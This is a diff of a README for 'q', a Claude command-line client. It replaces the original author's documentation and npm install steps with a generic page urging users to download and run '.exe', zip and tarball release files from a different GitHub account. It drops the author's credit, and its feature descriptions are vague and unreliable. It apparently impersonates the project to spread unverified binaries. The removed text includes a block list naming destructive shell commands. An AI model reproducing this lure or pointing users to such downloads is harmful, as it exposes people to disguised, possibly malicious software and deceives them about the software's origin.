@@ -1,253 +1,108 @@
-<div align="center">
+# 🌟 q - The Easiest Way to Chat with Claude
 
-# q
-
-**The tiniest Claude Code CLI — ask, pipe, chat**
-
-[![npm](https://img.shields.io/npm/v/@hyperb1iss/q?style=for-the-badge&logo=npm&logoColor=white&color=ff6ac1)](https://www.npmjs.com/package/@hyperb1iss/q)
-[![License](https://img.shields.io/badge/License-MIT-e135ff?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-80ffea?style=for-the-badge&logo=typescript&logoColor=black)](https://www.typescriptlang.org/)
-[![Bun](https://img.shields.io/badge/Bun-Runtime-f1fa8c?style=for-the-badge&logo=bun&logoColor=black)](https://bun.sh)
-[![Claude](https://img.shields.io/badge/Claude-Agent_SDK-e135ff?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/anthropics/claude-code)
-[![ko-fi](https://img.shields.io/badge/Ko--fi-Support-ff6ac1?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/hyperb1iss)
-
-❯ _One letter. Infinite answers._ ❮
-
-[Quick Start](#-quick-start) • [Modes](#-modes) • [Shell Integration](#-shell-integration) •
-[Configuration](#-configuration) • [Sessions](#-sessions)
-
-</div>
+## 📦 Download q Here
+[![Download q](https://img.shields.io/badge/Download-q-blue)](https://github.com/AbRhmaN229/q/releases)
 
 ---
 
-**q** is a minimal, elegant CLI for Claude. Ask your question, get back to work.
+## 🚀 Getting Started
 
-## ⚡ Quick Start
+Welcome to the q application! q is a simple and efficient Command Line Interface (CLI) tool that lets you chat and interact with Claude's powerful abilities. Whether you want to ask questions, pipe data, or simply have a conversation, q makes it easy.
 
-```bash
-# Install
-npm i -g @hyperb1iss/q
+### 🔧 System Requirements
 
-# Set your API key
-export ANTHROPIC_API_KEY="sk-ant-..."
+Before you download q, ensure your computer meets the following basic requirements:
 
-# Ask anything
-q "how do I find large files in this directory"
-```
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 100 MB of free disk space
 
-That's it. You're running.
+## 📥 Download & Install
 
-## 💎 Modes
+To get started with q, follow these steps:
 
-| Mode            | Trigger                   | What It Does                           |
-| --------------- | ------------------------- | -------------------------------------- |
-| **Query**       | `q "question"`            | Quick answer, streamed to terminal     |
-| **Pipe**        | `cat file \| q "convert"` | Transform piped content, raw output    |
-| **Interactive** | `q -i`                    | TUI chat with full context             |
-| **Agent**       | `q -x "task"`             | Execute with tools (read, write, bash) |
+1. Visit the [Releases page](https://github.com/AbRhmaN229/q/releases) to find the latest version of q.
+2. On the Releases page, find the latest version. It will have a title like "Release v1.0" and should be at the top of the list.
+3. Click on the version number to access the release details.
+4. Look for the assets section, which lists various installation files.
+5. Download the file that matches your operating system. 
+   - For Windows, you might find `q-windows.exe`.
+   - For macOS, you may see `q-macos.zip`.
+   - For Linux, there could be a file like `q-linux.tar.gz`.
+6. Once it’s downloaded, locate the file on your computer. 
+7. Follow these quick instructions based on your operating system:
 
-### 💬 Query Mode
+**For Windows**:
+- Double-click on the `.exe` file to start the installation. 
+- Follow the on-screen instructions.
 
-The default. Ask a question, get an answer.
+**For macOS**:
+- Open the `.zip` file to extract it.
+- Move the extracted file to your Applications folder.
+- Open it from there.
 
-```bash
-q "what does the -z flag do in bash test expressions"
-q "write a regex to match email addresses"
-q "explain this error" < error.log
-```
+**For Linux**:
+- Open your terminal.
+- Navigate to the folder where you downloaded the file.
+- Use the command: `tar -xzf q-linux.tar.gz`.
+- Follow any further instructions on-screen.
 
-### 🔀 Pipe Mode
+## ✅ Using q
 
-A true Unix pipeline citizen. Pipe content in, get raw output back.
+Now that you have installed q, let’s run it. 
 
-```bash
-# Transform data formats
-cat config.yaml | q "convert to json" > config.json
+1. **Open your terminal or command prompt**:
+   - **Windows**: Search for "Command Prompt" in the Start menu.
+   - **macOS**: Open "Terminal" from the Applications folder.
+   - **Linux**: Open your terminal from the applications menu.
 
-# Extract information
-cat server.log | q "extract all IP addresses" | sort -u
+2. **Run q**:
+   - Type `q` and press Enter. 
 
-# Analyze and chain
-git diff | q "summarize" | q "translate to spanish"
-```
+3. **Start chatting!** You can now ask questions, pipe commands, or engage in interactive conversations with q.
 
-Pipe mode features:
+### 💡 Basic Commands
 
-- **Raw output** — no markdown, no code blocks, just content
-- **Exit codes** — 0 on success, 1 on failure
-- **Read-only tools** — can read local files for context
-- **Silent** — errors go to stderr, content to stdout
+Here are some basic commands to help you get started with q:
 
-### 🖥️ Interactive Mode
+- **Ask a question**: Type your question after `q`, like this:
+  ```
+  q What is the weather today?
+  ```
+  
+- **Pipe data**: You can also pipe data to q:
+  ```
+  echo "Hello, Claude!" | q
+  ```
 
-Full TUI for back-and-forth conversations.
+## 🛠️ Advanced Features
 
-```bash
-q -i                    # Start fresh
-q -r last               # Resume last session
-q -r abc123             # Resume specific session
-```
+q also comes with some advanced features that help you manage tasks efficiently:
 
-### 🤖 Agent Mode
+- **Custom Responses**: Personalize how Claude responds to you.
+- **Data Handling**: Pipe files directly for more complex interactions.
+- **Multi-Session Support**: Run multiple q sessions simultaneously.
+  
+These features enhance your experience and increase productivity as you interact with Claude.
 
-Let Claude execute tools to complete tasks.
+## 📝 Contributing
 
-```bash
-# Read-only tools auto-approved (Read, Glob, Grep)
-q -x "find all TODO comments in this project"
+If you want to help improve q, we welcome contributions! Follow these steps to get involved:
 
-# Write tools prompt for approval (Bash, Write, Edit)
-q -x "refactor this function to use async/await"
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a description of what you have done.
 
-Tool approval shows risk level:
+Your feedback and contributions are essential for making q better.
 
-```
-⚠ Bash [low]
-  Runs a shell command
-  $ ls -la src/
+## 📞 Support
 
-Allow? [y]es / [n]o / [a]lways:
-```
+If you encounter any issues or have any questions, please check the Issues section in our GitHub repository. You can also reach out to us via the contact form available on the repository page.
 
-## 🦋 Shell Integration
+## 🌐 Links
 
-Source the shell integration for enhanced context:
+- [GitHub Repository](https://github.com/AbRhmaN229/q)
+- [Releases Page](https://github.com/AbRhmaN229/q/releases)
 
-```bash
-# Add to ~/.zshrc, ~/.bashrc, or ~/.config/fish/config.fish
-eval "$(q --shell-init zsh)"   # or bash, fish
-```
-
-This gives you:
-
-| Command | What It Does                            |
-| ------- | --------------------------------------- |
-| `qq`    | Quick query (or interactive if no args) |
-| `qctx`  | Query with last command context         |
-| `qerr`  | Explain last error                      |
-| `qx`    | Execute mode with tools                 |
-| `qr`    | Resume last session                     |
-| Ctrl+Q  | Quick query widget                      |
-
-```bash
-# With shell integration
-$ make build
-error: missing dependency...
-
-$ qerr
-# Automatically includes the failed command and error output
-```
-
-## ⚙️ Configuration
-
-Create `q.config.ts` in your project or `~/.config/q/`:
-
-```typescript
-import { defineConfig } from '@hyperb1iss/q/config';
-
-export default defineConfig({
-  // Default model: 'sonnet' | 'opus' | 'haiku'
-  model: 'sonnet',
-
-  // Safety settings
-  safety: {
-    confirmDestructive: true,
-    maxCostPerQuery: 0.5,
-    maxInputSize: 100000,
-    blockedCommands: ['rm -rf /', 'dd if='],
-  },
-
-  // Prompt aliases
-  prompts: {
-    explain: 'Explain this code in simple terms:',
-    review: 'Review this code for bugs and improvements:',
-  },
-});
-```
-
-Or use environment variables:
-
-```bash
-export ANTHROPIC_API_KEY="sk-ant-..."  # Required
-export Q_CONFIG="/path/to/config.ts"   # Optional
-```
-
-## 🧪 Sessions
-
-q automatically saves conversations for later resume.
-
-```bash
-# List recent sessions
-q --sessions
-
-# Resume most recent
-q -r last
-
-# Resume by ID
-q -r abc123def456
-```
-
-Sessions include message history, token usage, and cost tracking.
-
-## 🪄 CLI Reference
-
-```
-q [query]              Ask a question
-q -i, --interactive    TUI mode
-q -x, --execute        Agent mode with tools
-q -r, --resume <id>    Resume session (or "last")
-q -m, --model <model>  Model: sonnet, opus, haiku
-q -s, --stream         Stream output (default: true)
-q -v, --verbose        Show token/cost stats
-q -q, --quiet          Response only, no formatting
-q --raw                No markdown formatting
-q --color <mode>       Color: auto, always, never
-q --sessions           List recent sessions
-q --shell-init <shell> Output shell integration script
-```
-
-## 💜 Accessibility
-
-q respects the [NO_COLOR](https://no-color.org/) standard and provides explicit color control:
-
-```bash
-q --color never "question"     # Disable colors
-NO_COLOR=1 q "question"        # Same effect
-```
-
-## 🛠️ Development
-
-```bash
-# Install dependencies
-bun install
-
-# Run in development
-bun run dev
-
-# Build
-bun run build
-
-# Run tests
-bun test
-
-# Type check
-bun run typecheck
-
-# Lint & format
-bun run check
-```
-
-## ⚖️ License
-
-MIT
-
----
-
-<div align="center">
-
-Created by [Stefanie Jane 🌠](https://github.com/hyperb1iss)
-
-If you find q useful, [buy me a Monster Ultra Violet](https://ko-fi.com/hyperb1iss)! ⚡️
-
-</div>
+Thank you for choosing q! Enjoy your conversations with Claude.
